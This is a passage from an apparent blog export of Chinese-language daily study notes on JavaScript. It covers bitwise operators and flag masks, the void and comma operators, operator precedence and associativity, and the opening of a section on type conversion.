<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">toInt32(<span class="number">1.001</span>) <span class="comment">// 1</span></span><br><span class="line">toInt32(<span class="number">1.999</span>) <span class="comment">// 1</span></span><br><span class="line">toInt32(<span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line">toInt32(-<span class="number">1</span>) <span class="comment">// -1</span></span><br><span class="line">toInt32(<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>) + <span class="number">1</span>) <span class="comment">// 1</span></span><br><span class="line">toInt32(<span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>) - <span class="number">1</span>) <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>toInt32</code>可以将小数转为整数。对于一般的整数，返回值不会有任何变化。对于大于或等于2的32次方的整数，大于32位的数位都会被舍去</p>
<h4 id="4-2-二进制或运算符"><a href="#4-2-二进制或运算符" class="headerlink" title="4.2 二进制或运算符"></a>4.2 二进制或运算符</h4><p>二进制或运算符（<code>|</code>）逐位比较两个运算子，两个二进制位之中只要有一个为<code>1</code>，就返回<code>1</code>，否则返回<code>0</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> | <span class="number">3</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>0</code>和<code>3</code>的二进制形式分别是<code>00</code>和<code>11</code>，所以进行二进制或运算会得到<code>11</code>（即<code>3</code>）</p>
<p>位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与<code>0</code>进行二进制或运算，等同于对该数去除小数部分，即取整数位</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2.9</span> | <span class="number">0</span> <span class="comment">// 2</span></span><br><span class="line">-<span class="number">2.9</span> | <span class="number">0</span> <span class="comment">// -2</span></span><br></pre></td></tr></table></figure>
<p>需要注意的是，这种取整方法不适用超过32位整数最大值<code>2147483647</code>的数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2147483649.4</span> | <span class="number">0</span>;</span><br><span class="line"><span class="comment">// -2147483647</span></span><br></pre></td></tr></table></figure>

<h4 id="4-3-二进制与运算符"><a href="#4-3-二进制与运算符" class="headerlink" title="4.3 二进制与运算符"></a>4.3 二进制与运算符</h4><p>二进制与运算符（<code>&amp;</code>）的规则是逐位比较两个运算子，两个二进制位之中只要有一个位为<code>0</code>，就返回<code>0</code>，否则返回<code>1</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> &amp; <span class="number">3</span> <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>0</code>（二进制<code>00</code>）和<code>3</code>（二进制<code>11</code>）进行二进制与运算会得到<code>00</code>（即<code>0</code>）</p>
<h4 id="4-4-二进制否运算符"><a href="#4-4-二进制否运算符" class="headerlink" title="4.4 二进制否运算符"></a>4.4 二进制否运算符</h4><p>二进制否运算符（<code>~</code>）将每个二进制位都变为相反值（<code>0</code>变为<code>1</code>，<code>1</code>变为<code>0</code>）。它的返回结果有时比较难理解，因为涉及到计算机内部的数值表示机制</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">~ <span class="number">3</span> <span class="comment">// -4</span></span><br></pre></td></tr></table></figure>
<p>上面表达式对<code>3</code>进行二进制否运算，得到<code>-4</code>。之所以会有这样的结果，是因为位运算时，JavaScript 内部将所有的运算子都转为32位的二进制整数再进行运算<br><code>3</code>的32位整数形式是<code>00000000000000000000000000000011</code>，二进制否运算以后得到<code>11111111111111111111111111111100</code>。由于第一位（符号位）是<code>1</code>，所以这个数是一个负数。JavaScript 内部采用补码形式表示负数，即需要将这个数减去<code>1</code>，再取一次反，然后加上负号，才能得到这个负数对应的10进制值。这个数减去<code>1</code>等于<code>11111111111111111111111111111011</code>，再取一次反得到<code>00000000000000000000000000000100</code>，再加上负号就是<code>-4</code>。考虑到这样的过程比较麻烦，可以简单记忆成，一个数与自身的取反值相加，等于-1</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">~ -<span class="number">3</span> <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<p>上面表达式可以这样算，<code>-3</code>的取反值等于<code>-1</code>减去<code>-3</code>，结果为<code>2</code><br>对一个整数连续两次二进制否运算，得到它自身</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">~~<span class="number">3</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分。所以，对一个小数连续进行两次二进制否运算，能达到取整效果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">~~<span class="number">2.9</span> <span class="comment">// 2</span></span><br><span class="line">~~<span class="number">47.11</span> <span class="comment">// 47</span></span><br><span class="line">~~<span class="number">1.9999</span> <span class="comment">// 1</span></span><br><span class="line">~~<span class="number">3</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>使用二进制否运算取整，是所有取整方法中最快的一种</p>
<p>对字符串进行二进制否运算，JavaScript 引擎会先调用<code>Number</code>函数，将字符串转为数值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相当于~Number(&#x27;011&#x27;)</span></span><br><span class="line">~<span class="string">&#x27;011&#x27;</span>  <span class="comment">// -12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于~Number(&#x27;42 cats&#x27;)</span></span><br><span class="line">~<span class="string">&#x27;42 cats&#x27;</span> <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于~Number(&#x27;0xcafebabe&#x27;)</span></span><br><span class="line">~<span class="string">&#x27;0xcafebabe&#x27;</span> <span class="comment">// 889275713</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于~Number(&#x27;deadbeef&#x27;)</span></span><br><span class="line">~<span class="string">&#x27;deadbeef&#x27;</span> <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>
<p>对于其他类型的值，二进制否运算也是先用<code>Number</code>转为数值，然后再进行处理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 相当于 ~Number([])</span></span><br><span class="line">~[] <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于 ~Number(NaN)</span></span><br><span class="line">~<span class="literal">NaN</span> <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 相当于 ~Number(null)</span></span><br><span class="line">~<span class="literal">null</span> <span class="comment">// -1</span></span><br></pre></td></tr></table></figure>

<h4 id="4-5-异或运算符"><a href="#4-5-异或运算符" class="headerlink" title="4.5 异或运算符"></a>4.5 异或运算符</h4><p>异或运算（<code>^</code>）在两个二进制位不同时返回<code>1</code>，相同时返回<code>0</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> ^ <span class="number">3</span> <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>上面表达式中，<code>0</code>（二进制<code>00</code>）与<code>3</code>（二进制<code>11</code>）进行异或运算，它们每一个二进制位都不同，所以得到<code>11</code>（即<code>3</code>）</p>
<p>“异或运算”有一个特殊运用，连续对两个数a和b进行三次异或运算，<code>a^=b; b^=a; a^=b;</code>，可以互换它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">99</span>;</span><br><span class="line"></span><br><span class="line">a ^= b, b ^= a, a ^= b;</span><br><span class="line"></span><br><span class="line">a <span class="comment">// 99</span></span><br><span class="line">b <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>这是互换两个变量的值的最快方法<br>异或运算也可以用来取整</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">12.9</span> ^ <span class="number">0</span> <span class="comment">// 12</span></span><br></pre></td></tr></table></figure>
<h4 id="4-6-左移运算符"><a href="#4-6-左移运算符" class="headerlink" title="4.6 左移运算符"></a>4.6 左移运算符</h4><p>左移运算符（<code>&lt;&lt;</code>）表示将一个数的二进制值向左移动指定的位数，尾部补<code>0</code>，即乘以<code>2</code>的指定次方。向左移动的时候，最高位的符号位是一起移动的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 4 的二进制形式为100，</span></span><br><span class="line"><span class="comment">// 左移一位为1000（即十进制的8）</span></span><br><span class="line"><span class="comment">// 相当于乘以2的1次方</span></span><br><span class="line"><span class="number">4</span> &lt;&lt; <span class="number">1</span></span><br><span class="line"><span class="comment">// 8</span></span><br><span class="line"></span><br><span class="line">-<span class="number">4</span> &lt;&lt; <span class="number">1</span></span><br><span class="line"><span class="comment">// -8</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>-4</code>左移一位得到<code>-8</code>，是因为<code>-4</code>的二进制形式是<code>11111111111111111111111111111100</code>，左移一位后得到<code>11111111111111111111111111111000</code>，该数转为十进制（减去<code>1</code>后取反，再加上负号）即为<code>-8</code><br>如果左移0位，就相当于将该数值转为32位整数，等同于取整，对于正数和负数都有效</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">13.5</span> &lt;&lt; <span class="number">0</span></span><br><span class="line"><span class="comment">// 13</span></span><br><span class="line"></span><br><span class="line">-<span class="number">13.5</span> &lt;&lt; <span class="number">0</span></span><br><span class="line"><span class="comment">// -13</span></span><br></pre></td></tr></table></figure>
<p>左移运算符用于二进制数值非常方便</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> color = &#123;<span class="attr">r</span>: <span class="number">186</span>, <span class="attr">g</span>: <span class="number">218</span>, <span class="attr">b</span>: <span class="number">85</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RGB to HEX</span></span><br><span class="line"><span class="comment">// (1 &lt;&lt; 24)的作用为保证结果是6位数</span></span><br><span class="line"><span class="keyword">var</span> rgb2hex = <span class="function"><span class="keyword">function</span>(<span class="params">r, g, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;#&#x27;</span> + ((<span class="number">1</span> &lt;&lt; <span class="number">24</span>) + (r &lt;&lt; <span class="number">16</span>) + (g &lt;&lt; <span class="number">8</span>) + b)</span><br><span class="line">    .toString(<span class="number">16</span>) <span class="comment">// 先转成十六进制，然后返回字符串</span></span><br><span class="line">    .substr(<span class="number">1</span>);   <span class="comment">// 去除字符串的最高位，返回后面六个字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rgb2hex(color.r, color.g, color.b)</span><br><span class="line"><span class="comment">// &quot;#bada55&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码使用左移运算符，将颜色的 RGB 值转为 HEX 值</p>
<h4 id="4-7-右移运算符"><a href="#4-7-右移运算符" class="headerlink" title="4.7 右移运算符"></a>4.7 右移运算符</h4><p>右移运算符（<code>&gt;&gt;</code>）表示将一个数的二进制值向右移动指定的位数。如果是正数，头部全部补<code>0</code>；如果是负数，头部全部补<code>1</code>。右移运算符基本上相当于除以<code>2</code>的指定次方（最高位即符号位参与移动）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 因为4的二进制形式为 00000000000000000000000000000100，</span></span><br><span class="line"><span class="comment">// 右移一位得到 00000000000000000000000000000010，</span></span><br><span class="line"><span class="comment">// 即为十进制的2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">-<span class="number">4</span> &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">// -2</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 因为-4的二进制形式为 11111111111111111111111111111100，</span></span><br><span class="line"><span class="comment">// 右移一位，头部补1，得到 11111111111111111111111111111110,</span></span><br><span class="line"><span class="comment">// 即为十进制的-2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>右移运算可以模拟 <code>2</code> 的整除运算</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span> &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 相当于 5 / 2 = 2</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> &gt;&gt; <span class="number">2</span></span><br><span class="line"><span class="comment">// 5</span></span><br><span class="line"><span class="comment">// 相当于 21 / 4 = 5</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> &gt;&gt; <span class="number">3</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 相当于 21 / 8 = 2</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> &gt;&gt; <span class="number">4</span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 相当于 21 / 16 = 1</span></span><br></pre></td></tr></table></figure>

<h4 id="4-8-头部补零的右移运算符"><a href="#4-8-头部补零的右移运算符" class="headerlink" title="4.8 头部补零的右移运算符"></a>4.8 头部补零的右移运算符</h4><p>头部补零的右移运算符（<code>&gt;&gt;&gt;</code>）与右移运算符（<code>&gt;&gt;</code>）只有一个差别，就是一个数的二进制形式向右移动时，头部一律补零，而不考虑符号位。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（<code>&gt;&gt;</code>）完全一致，区别主要在于负数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> &gt;&gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">-<span class="number">4</span> &gt;&gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">// 2147483646</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// 因为-4的二进制形式为11111111111111111111111111111100，</span></span><br><span class="line"><span class="comment">// 带符号位的右移一位，得到01111111111111111111111111111110，</span></span><br><span class="line"><span class="comment">// 即为十进制的2147483646。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>这个运算实际上将一个值转为32位无符号整数<br>查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">-<span class="number">1</span> &gt;&gt;&gt; <span class="number">0</span> <span class="comment">// 4294967295</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，<code>-1</code>作为32位整数时，内部的储存形式使用无符号整数格式解读，值为 <code>4294967295</code>（即<code>(2^32)-1</code>，等于<code>11111111111111111111111111111111</code>）</p>
<h4 id="4-9-开关作用"><a href="#4-9-开关作用" class="headerlink" title="4.9 开关作用"></a>4.9 开关作用</h4><p>位运算符可以用作设置对象属性的开关</p>
<p>假定某个对象有四个开关，每个开关都是一个变量。那么，可以设置一个四位的二进制数，它的每个位对应一个开关</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> FLAG_A = <span class="number">1</span>; <span class="comment">// 0001</span></span><br><span class="line"><span class="keyword">var</span> FLAG_B = <span class="number">2</span>; <span class="comment">// 0010</span></span><br><span class="line"><span class="keyword">var</span> FLAG_C = <span class="number">4</span>; <span class="comment">// 0100</span></span><br><span class="line"><span class="keyword">var</span> FLAG_D = <span class="number">8</span>; <span class="comment">// 1000</span></span><br></pre></td></tr></table></figure>
<p>上面代码设置 A、B、C、D 四个开关，每个开关分别占有一个二进制位<br>然后，就可以用二进制与运算，检查当前设置是否打开了指定开关</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flags = <span class="number">5</span>; <span class="comment">// 二进制的0101</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FLAG_C) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0101 &amp; 0100 =&gt; 0100 =&gt; true</span></span><br></pre></td></tr></table></figure>
<p>上面代码检验是否打开了开关<code>C</code>。如果打开，会返回<code>true</code>，否则返回<code>false</code><br>现在假设需要打开<code>A</code>、<code>B</code>、<code>D</code>三个开关，我们可以构造一个掩码变量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mask = FLAG_A | FLAG_B | FLAG_D;</span><br><span class="line"><span class="comment">// 0001 | 0010 | 1000 =&gt; 1011</span></span><br></pre></td></tr></table></figure>
<p>上面代码对<code>A</code>、<code>B</code>、<code>D</code>三个变量进行二进制或运算，得到掩码值为二进制的<code>1011</code><br>有了掩码，二进制或运算可以确保打开指定的开关</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">flags = flags | mask;</span><br></pre></td></tr></table></figure>
<p>上面代码中，计算后得到的<code>flags</code>变量，代表三个开关的二进制位都打开了<br>二进制与运算可以将当前设置中凡是与开关设置不一样的项，全部关闭</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">flags = flags &amp; mask;</span><br></pre></td></tr></table></figure>
<p>异或运算可以切换（toggle）当前设置，即第一次执行可以得到当前设置的相反值，再执行一次又得到原来的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">flags = flags ^ mask;</span><br></pre></td></tr></table></figure>
<p>二进制否运算可以翻转当前设置，即原设置为<code>0</code>，运算后变为<code>1</code>；原设置为<code>1</code>，运算后变为<code>0</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">flags = ~flags;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS运算符-二进制位运算符</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0010</title>
    <url>/2021/05/09/%E6%89%93%E5%8D%A10010/</url>
    <content><![CDATA[<p><font color=#33a3dc>风吹又日晒，自由又自在</font></p>
<h2 id="JS运算符"><a href="#JS运算符" class="headerlink" title="JS运算符"></a>JS运算符</h2><h3 id="5-其它运算符，运算顺序"><a href="#5-其它运算符，运算顺序" class="headerlink" title="5. 其它运算符，运算顺序"></a>5. 其它运算符，运算顺序</h3><h4 id="5-1-void运算符"><a href="#5-1-void运算符" class="headerlink" title="5.1 void运算符"></a>5.1 void运算符</h4><p><code>void</code>运算符的作用是执行一个表达式，然后不返回任何值，或者说返回<code>undefined</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="number">0</span> <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">void</span>(<span class="number">0</span>) <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面是<code>void</code>运算符的两种写法，都正确。建议采用后一种形式，即总是使用圆括号。因为<code>void</code>运算符的优先性很高，如果不使用括号，容易造成错误的结果。比如，<code>void 4 + 7</code>实际上等同于<code>(void 4) + 7</code></p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">void</span> (x = <span class="number">5</span>) <span class="comment">//undefined</span></span><br><span class="line">x <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<p>这个运算符的主要用途是浏览器的书签工具（Bookmarklet），以及在超级链接中插入代码防止网页跳转</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;http://example.com&quot;</span> onclick=<span class="string">&quot;f(); return false;&quot;</span>&gt;点击&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，点击链接后，会先执行<code>onclick</code>的代码，由于<code>onclick</code>返回<code>false</code>，所以浏览器不会跳转到 example.com<br>void运算符可以取代上面的写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript: void(f())&quot;</span>&gt;文字&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>下面是一个更实际的例子，用户点击链接提交表单，但是不产生页面跳转</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript: void(document.form.submit())&quot;</span>&gt;</span><br><span class="line">  提交</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="5-2-逗号运算符"><a href="#5-2-逗号运算符" class="headerlink" title="5.2 逗号运算符"></a>5.2 逗号运算符</h4><p>逗号运算符用于对两个表达式求值，并返回后一个表达式的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span> <span class="comment">// &quot;b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> y = (x++, <span class="number">10</span>);</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line">y <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> value = (<span class="built_in">console</span>.log(<span class="string">&#x27;Hi!&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// Hi!</span></span><br><span class="line"></span><br><span class="line">value <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，先执行逗号之前的操作，然后返回逗号后面的值</p>
<h4 id="5-3-运算顺序"><a href="#5-3-运算顺序" class="headerlink" title="5.3 运算顺序"></a>5.3 运算顺序</h4><h5 id="5-3-1-优先级"><a href="#5-3-1-优先级" class="headerlink" title="5.3.1 优先级"></a>5.3.1 优先级</h5><p>JavaScript 各种运算符的优先级别（Operator Precedence）是不一样的。优先级高的运算符先执行，优先级低的运算符后执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> + <span class="number">5</span> * <span class="number">6</span> <span class="comment">// 34</span></span><br></pre></td></tr></table></figure>
<p>上面的代码中，乘法运算符（<code>*</code>）的优先性高于加法运算符（<code>+</code>），所以先执行乘法，再执行加法，相当于下面这样</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span> + (<span class="number">5</span> * <span class="number">6</span>) <span class="comment">// 34</span></span><br></pre></td></tr></table></figure>
<p>如果多个运算符混写在一起，常常会导致令人困惑的代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = arr.length &lt;= <span class="number">0</span> || arr[<span class="number">0</span>] === <span class="literal">undefined</span> ? x : arr[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>上面代码中，变量<code>y</code>的值就很难看出来，因为这个表达式涉及5个运算符，到底谁的优先级最高，实在不容易记住</p>
<p>根据语言规格，这五个运算符的优先级从高到低依次为：小于等于（<code>&lt;=</code>)、严格相等（<code>===</code>）、或（<code>||</code>）、三元（<code>?:</code>）、等号（<code>=</code>）。因此上面的表达式，实际的运算顺序如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> y = ((arr.length &lt;= <span class="number">0</span>) || (arr[<span class="number">0</span>] === <span class="literal">undefined</span>)) ? x : arr[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
<p>记住所有运算符的优先级，是非常难的，也是没有必要的</p>
<h5 id="5-3-2-圆括号的作用"><a href="#5-3-2-圆括号的作用" class="headerlink" title="5.3.2 圆括号的作用"></a>5.3.2 圆括号的作用</h5><p>圆括号<code>（）</code>可以用来提高运算的优先级，因为它的优先级是最高的，即圆括号中的表达式会第一个运算</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">4</span> + <span class="number">5</span>) * <span class="number">6</span> <span class="comment">// 54</span></span><br></pre></td></tr></table></figure>
<p>圆括号不是运算符，而是一种语法结构。它一共有两种用法：一种是把表达式放在圆括号之中，提升运算的优先级；另一种是跟在函数的后面，作用是调用函数<br>注意，因为圆括号不是运算符，所以不具有求值作用，只改变运算的优先级</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line">(x) = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码的第二行，如果圆括号具有求值作用，那么就会变成<code>1 = 2</code>，这是会报错了。但是，上面的代码可以运行，这验证了圆括号只改变优先级，不会求值<br>这也意味着，如果整个表达式都放在圆括号之中，那么不会有任何效果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(expression)</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">expression</span><br></pre></td></tr></table></figure>

<p>函数放在圆括号中，会返回函数本身。如果圆括号紧跟在函数的后面，就表示调用函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(f) <span class="comment">// function f()&#123;return 1;&#125;</span></span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>圆括号之中，只能放置表达式，如果将语句放在圆括号之中，就会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">var</span> a = <span class="number">1</span>)</span><br><span class="line"><span class="comment">// SyntaxError: Unexpected token var</span></span><br></pre></td></tr></table></figure>

<h5 id="5-3-3-左结合与右结合"><a href="#5-3-3-左结合与右结合" class="headerlink" title="5.3.3 左结合与右结合"></a>5.3.3 左结合与右结合</h5><p>JavaScript 语言的大多数运算符是“左结合”，请看下面加法运算符的例子</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">x + y + z</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引擎解释如下</span></span><br><span class="line">(x + y) + z</span><br></pre></td></tr></table></figure>

<p>少数运算符是“右结合”，其中最主要的是赋值运算符（<code>=</code>）和三元条件运算符（<code>?:</code>）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">w = x = y = z;</span><br><span class="line">q = a ? b : c ? d : e ? f : g;</span><br></pre></td></tr></table></figure>
<p>上面代码的解释方式如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">w = (x = (y = z));</span><br><span class="line">q = a ? b : (c ? d : (e ? f : g));</span><br></pre></td></tr></table></figure>
<p>上面的两行代码，都是右侧的运算数结合在一起。</p>
<p>另外，指数运算符（<code>**</code>）也是右结合</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> ** <span class="number">3</span> ** <span class="number">2</span></span><br><span class="line"><span class="comment">// 相当于 2 ** (3 ** 2)</span></span><br><span class="line"><span class="comment">// 512</span></span><br></pre></td></tr></table></figure>


<p><code>well,that&#39;s all for today.</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS运算符-其它运算符，运算顺序</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0011</title>
    <url>/2021/05/10/%E6%89%93%E5%8D%A10011/</url>
    <content><![CDATA[<p><font color=#BDB76B>花褪残红青杏小。燕子飞时，绿水人家绕。枝上柳绵吹又少。天涯何处无芳草。</p>
<p>墙里秋千墙外道。墙外行人，墙里佳人笑。笑渐不闻声渐悄。多情却被无情恼。</font></p>
<h2 id="JS语法"><a href="#JS语法" class="headerlink" title="JS语法"></a>JS语法</h2><h3 id="1-数据类型的转换"><a href="#1-数据类型的转换" class="headerlink" title="1. 数据类型的转换"></a>1. 数据类型的转换</h3><h4 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h4><p>JavaScript 是一种动态类型语言，变量没有类型限制，可以随时赋予任意值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = y ? <span class="number">1</span> : <span class="string">&#x27;a&#x27;</span>;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>上面代码中，变量x到底是数值还是字符串，取决于另一个变量<code>y</code>的值。<code>y</code>为<code>true</code>时，<code>x</code>是一个数值；<code>y</code>为<code>false</code>时，<code>x</code>是一个字符串。这意味着，<code>x</code>的类型没法在编译阶段就知道，必须等到运行时才能知道<br>虽然变量的数据类型是不确定的，但是各种运算符对数据类型是有要求的。如果运算符发现，运算子的类型与预期不符，就会自动转换类型。比如，减法运算符预期左右两侧的运算子应该是数值，如果不是，就会自动将它们转为数值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;4&#x27;</span> - <span class="string">&#x27;3&#x27;</span> <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，虽然是两个字符串相减，但是依然会得到结果数值<code>1</code>，原因就在于 JavaScript 将运算子自动转为了数值</p>
